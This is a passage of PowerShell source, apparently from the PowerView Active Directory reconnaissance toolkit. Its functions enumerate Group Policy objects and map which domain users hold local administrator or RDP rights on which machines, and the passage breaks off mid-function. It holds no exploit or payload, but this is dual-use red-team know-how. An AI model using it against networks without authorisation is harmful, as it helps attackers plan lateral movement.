.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER SecurityMasks

Specifies an option for examining security information of a directory object.
One of 'Dacl', 'Group', 'None', 'Owner', 'Sacl'.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER FindOne

Only return one result object.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.PARAMETER Raw

Switch. Return raw results instead of translating the fields into a custom PSObject.

.EXAMPLE

Get-DomainGPO -Domain testlab.local

Return all GPOs for the testlab.local domain

.EXAMPLE

Get-DomainGPO -ComputerName windows1.testlab.local

Returns all GPOs applied windows1.testlab.local

.EXAMPLE

"{F260B76D-55C8-46C5-BEF1-9016DD98E272}","Test GPO" | Get-DomainGPO

Return the GPOs with the name of "{F260B76D-55C8-46C5-BEF1-9016DD98E272}" and the display
name of "Test GPO"

.EXAMPLE

Get-DomainGPO -LDAPFilter '(!primarygroupid=513)' -Properties samaccountname,lastlogon

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainGPO -Credential $Cred

.OUTPUTS

PowerView.GPO

Custom PSObject with translated GPO property fields.

PowerView.GPO.Raw

The raw DirectoryServices.SearchResult object, if -Raw is enabled.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.GPO')]
    [OutputType('PowerView.GPO.Raw')]
    [CmdletBinding(DefaultParameterSetName = 'None')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $Identity,

        [Parameter(ParameterSetName = 'ComputerIdentity')]
        [Alias('ComputerName')]
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerIdentity,

        [Parameter(ParameterSetName = 'UserIdentity')]
        [Alias('UserName')]
        [ValidateNotNullOrEmpty()]
        [String]
        $UserIdentity,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Alias('ReturnOne')]
        [Switch]
        $FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    BEGIN {
        $SearcherArguments = @{}
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
        $GPOSearcher = Get-DomainSearcher @SearcherArguments
    }

    PROCESS {
        if ($GPOSearcher) {
            if ($PSBoundParameters['ComputerIdentity'] -or $PSBoundParameters['UserIdentity']) {
                $GPOAdsPaths = @()
                if ($SearcherArguments['Properties']) {
                    $OldProperties = $SearcherArguments['Properties']
                }
                $SearcherArguments['Properties'] = 'distinguishedname,dnshostname'
                $TargetComputerName = $Null

                if ($PSBoundParameters['ComputerIdentity']) {
                    $SearcherArguments['Identity'] = $ComputerIdentity
                    $Computer = Get-DomainComputer @SearcherArguments -FindOne | Select-Object -First 1
                    if(-not $Computer) {
                        Write-Verbose "[Get-DomainGPO] Computer '$ComputerIdentity' not found!"
                    }
                    $ObjectDN = $Computer.distinguishedname
                    $TargetComputerName = $Computer.dnshostname
                }
                else {
                    $SearcherArguments['Identity'] = $UserIdentity
                    $User = Get-DomainUser @SearcherArguments -FindOne | Select-Object -First 1
                    if(-not $User) {
                        Write-Verbose "[Get-DomainGPO] User '$UserIdentity' not found!"
                    }
                    $ObjectDN = $User.distinguishedname
                }

                # extract all OUs the target user/computer is a part of
                $ObjectOUs = @()
                $ObjectOUs += $ObjectDN.split(',') | ForEach-Object {
                    if($_.startswith('OU=')) {
                        $ObjectDN.SubString($ObjectDN.IndexOf("$($_),"))
                    }
                }
                Write-Verbose "[Get-DomainGPO] object OUs: $ObjectOUs"

                if ($ObjectOUs) {
                    # find all the GPOs linked to the user/computer's OUs
                    $SearcherArguments.Remove('Properties')
                    $InheritanceDisabled = $False
                    ForEach($ObjectOU in $ObjectOUs) {
                        $SearcherArguments['Identity'] = $ObjectOU
                        $GPOAdsPaths += Get-DomainOU @SearcherArguments | ForEach-Object {
                            # extract any GPO links for this particular OU the computer is a part of
                            if ($_.gplink) {
                                $_.gplink.split('][') | ForEach-Object {
                                    if ($_.startswith('LDAP')) {
                                        $Parts = $_.split(';')
                                        $GpoDN = $Parts[0]
                                        $Enforced = $Parts[1]

                                        if ($InheritanceDisabled) {
                                            # if inheritance has already been disabled and this GPO is set as "enforced"
                                            #   then add it, otherwise ignore it
                                            if ($Enforced -eq 2) {
                                                $GpoDN
                                            }
                                        }
                                        else {
                                            # inheritance not marked as disabled yet
                                            $GpoDN
                                        }
                                    }
                                }
                            }

                            # if this OU has GPO inheritence disabled, break so additional OUs aren't processed
                            if ($_.gpoptions -eq 1) {
                                $InheritanceDisabled = $True
                            }
                        }
                    }
                }

                if ($TargetComputerName) {
                    # find all the GPOs linked to the computer's site
                    $ComputerSite = (Get-NetComputerSiteName -ComputerName $TargetComputerName).SiteName
                    if($ComputerSite -and ($ComputerSite -notlike 'Error*')) {
                        $SearcherArguments['Identity'] = $ComputerSite
                        $GPOAdsPaths += Get-DomainSite @SearcherArguments | ForEach-Object {
                            if($_.gplink) {
                                # extract any GPO links for this particular site the computer is a part of
                                $_.gplink.split('][') | ForEach-Object {
                                    if ($_.startswith('LDAP')) {
                                        $_.split(';')[0]
                                    }
                                }
                            }
                        }
                    }
                }

                # find any GPOs linked to the user/computer's domain
                $ObjectDomainDN = $ObjectDN.SubString($ObjectDN.IndexOf('DC='))
                $SearcherArguments.Remove('Identity')
                $SearcherArguments.Remove('Properties')
                $SearcherArguments['LDAPFilter'] = "(objectclass=domain)(distinguishedname=$ObjectDomainDN)"
                $GPOAdsPaths += Get-DomainObject @SearcherArguments | ForEach-Object {
                    if($_.gplink) {
                        # extract any GPO links for this particular domain the computer is a part of
                        $_.gplink.split('][') | ForEach-Object {
                            if ($_.startswith('LDAP')) {
                                $_.split(';')[0]
                            }
                        }
                    }
                }
                Write-Verbose "[Get-DomainGPO] GPOAdsPaths: $GPOAdsPaths"

                # restore the old properites to return, if set
                if ($OldProperties) { $SearcherArguments['Properties'] = $OldProperties }
                else { $SearcherArguments.Remove('Properties') }
                $SearcherArguments.Remove('Identity')

                $GPOAdsPaths | Where-Object {$_ -and ($_ -ne '')} | ForEach-Object {
                    # use the gplink as an ADS path to enumerate all GPOs for the computer
                    $SearcherArguments['SearchBase'] = $_
                    $SearcherArguments['LDAPFilter'] = "(objectCategory=groupPolicyContainer)"
                    Get-DomainObject @SearcherArguments | ForEach-Object {
                        if ($PSBoundParameters['Raw']) {
                            $_.PSObject.TypeNames.Insert(0, 'PowerView.GPO.Raw')
                        }
                        else {
                            $_.PSObject.TypeNames.Insert(0, 'PowerView.GPO')
                        }
                        $_
                    }
                }
            }
            else {
                $IdentityFilter = ''
                $Filter = ''
                $Identity | Where-Object {$_} | ForEach-Object {
                    $IdentityInstance = $_.Replace('(', '\28').Replace(')', '\29')
                    if ($IdentityInstance -match 'LDAP://|^CN=.*') {
                        $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                        if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                            # if a -Domain isn't explicitly set, extract the object domain out of the distinguishedname
                            #   and rebuild the domain searcher
                            $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                            Write-Verbose "[Get-DomainGPO] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
                            $SearcherArguments['Domain'] = $IdentityDomain
                            $GPOSearcher = Get-DomainSearcher @SearcherArguments
                            if (-not $GPOSearcher) {
                                Write-Warning "[Get-DomainGPO] Unable to retrieve domain searcher for '$IdentityDomain'"
                            }
                        }
                    }
                    elseif ($IdentityInstance -match '{.*}') {
                        $IdentityFilter += "(name=$IdentityInstance)"
                    }
                    else {
                        try {
                            $GuidByteString = (-Join (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object {$_.ToString('X').PadLeft(2,'0')})) -Replace '(..)','\$1'
                            $IdentityFilter += "(objectguid=$GuidByteString)"
                        }
                        catch {
                            $IdentityFilter += "(displayname=$IdentityInstance)"
                        }
                    }
                }
                if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                    $Filter += "(|$IdentityFilter)"
                }

                if ($PSBoundParameters['LDAPFilter']) {
                    Write-Verbose "[Get-DomainGPO] Using additional LDAP filter: $LDAPFilter"
                    $Filter += "$LDAPFilter"
                }

                $GPOSearcher.filter = "(&(objectCategory=groupPolicyContainer)$Filter)"
                Write-Verbose "[Get-DomainGPO] filter string: $($GPOSearcher.filter)"

                if ($PSBoundParameters['FindOne']) { $Results = $GPOSearcher.FindOne() }
                else { $Results = $GPOSearcher.FindAll() }
                $Results | Where-Object {$_} | ForEach-Object {
                    if ($PSBoundParameters['Raw']) {
                        # return raw result objects
                        $GPO = $_
                        $GPO.PSObject.TypeNames.Insert(0, 'PowerView.GPO.Raw')
                    }
                    else {
                        if ($PSBoundParameters['SearchBase'] -and ($SearchBase -Match '^GC://')) {
                            $GPO = Convert-LDAPProperty -Properties $_.Properties
                            try {
                                $GPODN = $GPO.distinguishedname
                                $GPODomain = $GPODN.SubString($GPODN.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                                $gpcfilesyspath = "\\$GPODomain\SysVol\$GPODomain\Policies\$($GPO.cn)"
                                $GPO | Add-Member Noteproperty 'gpcfilesyspath' $gpcfilesyspath
                            }
                            catch {
                                Write-Verbose "[Get-DomainGPO] Error calculating gpcfilesyspath for: $($GPO.distinguishedname)"
                            }
                        }
                        else {
                            $GPO = Convert-LDAPProperty -Properties $_.Properties
                        }
                        $GPO.PSObject.TypeNames.Insert(0, 'PowerView.GPO')
                    }
                    $GPO
                }
                if ($Results) {
                    try { $Results.dispose() }
                    catch {
                        Write-Verbose "[Get-DomainGPO] Error disposing of the Results object: $_"
                    }
                }
                $GPOSearcher.dispose()
            }
        }
    }
}


function Get-DomainGPOLocalGroup {
<#
.SYNOPSIS

Returns all GPOs in a domain that modify local group memberships through 'Restricted Groups'
or Group Policy preferences. Also return their user membership mappings, if they exist.

Author: @harmj0y  
License: BSD 3-Clause  
Required Dependencies: Get-DomainGPO, Get-GptTmpl, Get-GroupsXML, ConvertTo-SID, ConvertFrom-SID  

.DESCRIPTION

First enumerates all GPOs in the current/target domain using Get-DomainGPO with passed
arguments, and for each GPO checks if 'Restricted Groups' are set with GptTmpl.inf or
group membership is set through Group Policy Preferences groups.xml files. For any
GptTmpl.inf files found, the file is parsed with Get-GptTmpl and any 'Group Membership'
section data is processed if present. Any found Groups.xml files are parsed with
Get-GroupsXML and those memberships are returned as well.

.PARAMETER Identity

A display name (e.g. 'Test GPO'), DistinguishedName (e.g. 'CN={F260B76D-55C8-46C5-BEF1-9016DD98E272},CN=Policies,CN=System,DC=testlab,DC=local'),
GUID (e.g. '10ec320d-3111-4ef4-8faf-8f14f4adc789'), or GPO name (e.g. '{F260B76D-55C8-46C5-BEF1-9016DD98E272}'). Wildcards accepted.

.PARAMETER ResolveMembersToSIDs

Switch. Indicates that any member names should be resolved to their domain SIDs.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER SearchBase

The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainGPOLocalGroup

Returns all local groups set by GPO along with their members and memberof.

.EXAMPLE

Get-DomainGPOLocalGroup -ResolveMembersToSIDs

Returns all local groups set by GPO along with their members and memberof,
and resolve any members to their domain SIDs.

.EXAMPLE

'{0847C615-6C4E-4D45-A064-6001040CC21C}' | Get-DomainGPOLocalGroup

Return any GPO-set groups for the GPO with the given name/GUID.

.EXAMPLE

Get-DomainGPOLocalGroup 'Desktops'

Return any GPO-set groups for the GPO with the given display name.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainGPOLocalGroup -Credential $Cred

.LINK

https://morgansimonsenblog.azurewebsites.net/tag/groups/
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.GPOGroup')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $Identity,

        [Switch]
        $ResolveMembersToSIDs,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $SearcherArguments = @{}
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['LDAPFilter']) { $SearcherArguments['LDAPFilter'] = $Domain }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }

        $ConvertArguments = @{}
        if ($PSBoundParameters['Domain']) { $ConvertArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Server']) { $ConvertArguments['Server'] = $Server }
        if ($PSBoundParameters['Credential']) { $ConvertArguments['Credential'] = $Credential }

        $SplitOption = [System.StringSplitOptions]::RemoveEmptyEntries
    }

    PROCESS {
        if ($PSBoundParameters['Identity']) { $SearcherArguments['Identity'] = $Identity }

        Get-DomainGPO @SearcherArguments | ForEach-Object {
            $GPOdisplayName = $_.displayname
            $GPOname = $_.name
            $GPOPath = $_.gpcfilesyspath

            $ParseArgs =  @{ 'GptTmplPath' = "$GPOPath\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf" }
            if ($PSBoundParameters['Credential']) { $ParseArgs['Credential'] = $Credential }

            # first parse the 'Restricted Groups' file (GptTmpl.inf) if it exists
            $Inf = Get-GptTmpl @ParseArgs

            if ($Inf -and ($Inf.psbase.Keys -contains 'Group Membership')) {
                $Memberships = @{}

                # parse the members/memberof fields for each entry
                ForEach ($Membership in $Inf.'Group Membership'.GetEnumerator()) {
                    $Group, $Relation = $Membership.Key.Split('__', $SplitOption) | ForEach-Object {$_.Trim()}
                    # extract out ALL members
                    $MembershipValue = $Membership.Value | Where-Object {$_} | ForEach-Object { $_.Trim('*') } | Where-Object {$_}

                    if ($PSBoundParameters['ResolveMembersToSIDs']) {
                        # if the resulting member is username and not a SID, attempt to resolve it
                        $GroupMembers = @()
                        ForEach ($Member in $MembershipValue) {
                            if ($Member -and ($Member.Trim() -ne '')) {
                                if ($Member -notmatch '^S-1-.*') {
                                    $ConvertToArguments = @{'ObjectName' = $Member}
                                    if ($PSBoundParameters['Domain']) { $ConvertToArguments['Domain'] = $Domain }
                                    $MemberSID = ConvertTo-SID @ConvertToArguments

                                    if ($MemberSID) {
                                        $GroupMembers += $MemberSID
                                    }
                                    else {
                                        $GroupMembers += $Member
                                    }
                                }
                                else {
                                    $GroupMembers += $Member
                                }
                            }
                        }
                        $MembershipValue = $GroupMembers
                    }

                    if (-not $Memberships[$Group]) {
                        $Memberships[$Group] = @{}
                    }
                    if ($MembershipValue -isnot [System.Array]) {$MembershipValue = @($MembershipValue)}
                    $Memberships[$Group].Add($Relation, $MembershipValue)
                }

                ForEach ($Membership in $Memberships.GetEnumerator()) {
                    if ($Membership -and $Membership.Key -and ($Membership.Key -match '^\*')) {
                        # if the SID is already resolved (i.e. begins with *) try to resolve SID to a name
                        $GroupSID = $Membership.Key.Trim('*')
                        if ($GroupSID -and ($GroupSID.Trim() -ne '')) {
                            $GroupName = ConvertFrom-SID -ObjectSID $GroupSID @ConvertArguments
                        }
                        else {
                            $GroupName = $False
                        }
                    }
                    else {
                        $GroupName = $Membership.Key

                        if ($GroupName -and ($GroupName.Trim() -ne '')) {
                            if ($Groupname -match 'Administrators') {
                                $GroupSID = 'S-1-5-32-544'
                            }
                            elseif ($Groupname -match 'Remote Desktop') {
                                $GroupSID = 'S-1-5-32-555'
                            }
                            elseif ($Groupname -match 'Guests') {
                                $GroupSID = 'S-1-5-32-546'
                            }
                            elseif ($GroupName.Trim() -ne '') {
                                $ConvertToArguments = @{'ObjectName' = $Groupname}
                                if ($PSBoundParameters['Domain']) { $ConvertToArguments['Domain'] = $Domain }
                                $GroupSID = ConvertTo-SID @ConvertToArguments
                            }
                            else {
                                $GroupSID = $Null
                            }
                        }
                    }

                    $GPOGroup = New-Object PSObject
                    $GPOGroup | Add-Member Noteproperty 'GPODisplayName' $GPODisplayName
                    $GPOGroup | Add-Member Noteproperty 'GPOName' $GPOName
                    $GPOGroup | Add-Member Noteproperty 'GPOPath' $GPOPath
                    $GPOGroup | Add-Member Noteproperty 'GPOType' 'RestrictedGroups'
                    $GPOGroup | Add-Member Noteproperty 'Filters' $Null
                    $GPOGroup | Add-Member Noteproperty 'GroupName' $GroupName
                    $GPOGroup | Add-Member Noteproperty 'GroupSID' $GroupSID
                    $GPOGroup | Add-Member Noteproperty 'GroupMemberOf' $Membership.Value.Memberof
                    $GPOGroup | Add-Member Noteproperty 'GroupMembers' $Membership.Value.Members
                    $GPOGroup.PSObject.TypeNames.Insert(0, 'PowerView.GPOGroup')
                    $GPOGroup
                }
            }

            # now try to the parse group policy preferences file (Groups.xml) if it exists
            $ParseArgs =  @{
                'GroupsXMLpath' = "$GPOPath\MACHINE\Preferences\Groups\Groups.xml"
            }

            Get-GroupsXML @ParseArgs | ForEach-Object {
                if ($PSBoundParameters['ResolveMembersToSIDs']) {
                    $GroupMembers = @()
                    ForEach ($Member in $_.GroupMembers) {
                        if ($Member -and ($Member.Trim() -ne '')) {
                            if ($Member -notmatch '^S-1-.*') {

                                # if the resulting member is username and not a SID, attempt to resolve it
                                $ConvertToArguments = @{'ObjectName' = $Groupname}
                                if ($PSBoundParameters['Domain']) { $ConvertToArguments['Domain'] = $Domain }
                                $MemberSID = ConvertTo-SID -Domain $Domain -ObjectName $Member

                                if ($MemberSID) {
                                    $GroupMembers += $MemberSID
                                }
                                else {
                                    $GroupMembers += $Member
                                }
                            }
                            else {
                                $GroupMembers += $Member
                            }
                        }
                    }
                    $_.GroupMembers = $GroupMembers
                }

                $_ | Add-Member Noteproperty 'GPODisplayName' $GPODisplayName
                $_ | Add-Member Noteproperty 'GPOName' $GPOName
                $_ | Add-Member Noteproperty 'GPOType' 'GroupPolicyPreferences'
                $_.PSObject.TypeNames.Insert(0, 'PowerView.GPOGroup')
                $_
            }
        }
    }
}


function Get-DomainGPOUserLocalGroupMapping {
<#
.SYNOPSIS

Enumerates the machines where a specific domain user/group is a member of a specific
local group, all through GPO correlation. If no user/group is specified, all
discoverable mappings are returned.

Author: @harmj0y  
License: BSD 3-Clause  
Required Dependencies: Get-DomainGPOLocalGroup, Get-DomainObject, Get-DomainComputer, Get-DomainOU, Get-DomainSite, Get-DomainGroup  

.DESCRIPTION

Takes a user/group name and optional domain, and determines the computers in the domain
the user/group has local admin (or RDP) rights to.

It does this by:
    1.  resolving the user/group to its proper SID
    2.  enumerating all groups the user/group is a current part of
        and extracting all target SIDs to build a target SID list
    3.  pulling all GPOs that set 'Restricted Groups' or Groups.xml by calling
        Get-DomainGPOLocalGroup
    4.  matching the target SID list to the queried GPO SID list
        to enumerate all GPO the user is effectively applied with
    5.  enumerating all OUs and sites and applicable GPO GUIs are
        applied to through gplink enumerating
    6.  querying for all computers under the given OUs or sites

If no user/group is specified, all user/group -> machine mappings discovered through
GPO relationships are returned.

.PARAMETER Identity

A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201)
for the user/group to identity GPO local group mappings for.

.PARAMETER LocalGroup

The local group to check access against.
Can be "Administrators" (S-1-5-32-544), "RDP/Remote Desktop Users" (S-1-5-32-555),
or a custom local SID. Defaults to local 'Administrators'.

.PARAMETER Domain

Specifies the domain to enumerate GPOs for, defaults to the current domain.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainGPOUserLocalGroupMapping

Find all user/group -> machine relationships where the user/group is a member
of the local administrators group on target machines.

.EXAMPLE

Get-DomainGPOUserLocalGroupMapping -Identity dfm -Domain dev.testlab.local

Find all computers that dfm user has local administrator rights to in
the dev.testlab.local domain.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainGPOUserLocalGroupMapping -Credential $Cred

.OUTPUTS

PowerView.GPOLocalGroupMapping

A custom PSObject containing any target identity information and what local
group memberships they're a part of through GPO correlation.

.LINK

http://www.harmj0y.net/blog/redteaming/where-my-admins-at-gpo-edition/
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.GPOUserLocalGroupMapping')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String]
        $Identity,

        [String]
        [ValidateSet('Administrators', 'S-1-5-32-544', 'RDP', 'Remote Desktop Users', 'S-1-5-32-555')]
        $LocalGroup = 'Administrators',

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $CommonArguments = @{}
        if ($PSBoundParameters['Domain']) { $CommonArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Server']) { $CommonArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $CommonArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $CommonArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $CommonArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $CommonArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $CommonArguments['Credential'] = $Credential }
    }

    PROCESS {
        $TargetSIDs = @()

        if ($PSBoundParameters['Identity']) {
            $TargetSIDs += Get-DomainObject @CommonArguments -Identity $Identity | Select-Object -Expand objectsid
            $TargetObjectSID = $TargetSIDs
            if (-not $TargetSIDs) {
                Throw "[Get-DomainGPOUserLocalGroupMapping] Unable to retrieve SID for identity '$Identity'"
            }
        }
        else {
            # no filtering/match all
            $TargetSIDs = @('*')
        }

        if ($LocalGroup -match 'S-1-5') {
            $TargetLocalSID = $LocalGroup
        }
        elseif ($LocalGroup -match 'Admin') {
            $TargetLocalSID = 'S-1-5-32-544'
        }
        else {
            # RDP
            $TargetLocalSID = 'S-1-5-32-555'
        }

        if ($TargetSIDs[0] -ne '*') {
            ForEach ($TargetSid in $TargetSids) {
                Write-Verbose "[Get-DomainGPOUserLocalGroupMapping] Enumerating nested group memberships for: '$TargetSid'"
                $TargetSIDs += Get-DomainGroup @CommonArguments -Properties 'objectsid' -MemberIdentity $TargetSid | Select-Object -ExpandProperty objectsid
            }
        }

        Write-Verbose "[Get-DomainGPOUserLocalGroupMapping] Target localgroup SID: $TargetLocalSID"
        Write-Verbose "[Get-DomainGPOUserLocalGroupMapping] Effective target domain SIDs: $TargetSIDs"

        $GPOgroups = Get-DomainGPOLocalGroup @CommonArguments -ResolveMembersToSIDs | ForEach-Object {
            $GPOgroup = $_
            # if the locally set group is what we're looking for, check the GroupMembers ('members') for our target SID
            if ($GPOgroup.GroupSID -match $TargetLocalSID) {
                $GPOgroup.GroupMembers | Where-Object {$_} | ForEach-Object {
                    if ( ($TargetSIDs[0] -eq '*') -or ($TargetSIDs -Contains $_) ) {
                        $GPOgroup
                    }
                }
            }
            # if the group is a 'memberof' the group we're looking for, check GroupSID against the targt SIDs
            if ( ($GPOgroup.GroupMemberOf -contains $TargetLocalSID) ) {
                if ( ($TargetSIDs[0] -eq '*') -or ($TargetSIDs -Contains $GPOgroup.GroupSID) ) {
                    $GPOgroup
                }
            }
        } | Sort-Object -Property GPOName -Unique

        $GPOgroups | Where-Object {$_} | ForEach-Object {
            $GPOname = $_.GPODisplayName
            $GPOguid = $_.GPOName
            $GPOPath = $_.GPOPath
            $GPOType = $_.GPOType
            if ($_.GroupMembers) {
                $GPOMembers = $_.GroupMembers
            }
            else {
                $GPOMembers = $_.GroupSID
            }

            $Filters = $_.Filters

            if ($TargetSIDs[0] -eq '*') {
                # if the * wildcard was used, set the targets to all GPO members so everything it output
                $TargetObjectSIDs = $GPOMembers
            }
            else {
                $TargetObjectSIDs = $TargetObjectSID
            }

            # find any OUs that have this GPO linked through gpLink
            Get-DomainOU @CommonArguments -Raw -Properties 'name,distinguishedname' -GPLink $GPOGuid | ForEach-Object {
                if ($Filters) {
                    $OUComputers = Get-DomainComputer @CommonArguments -Properties 'dnshostname,distinguishedname' -SearchBase $_.Path | Where-Object {$_.distinguishedname -match ($Filters.Value)} | Select-Object -ExpandProperty dnshostname
                }
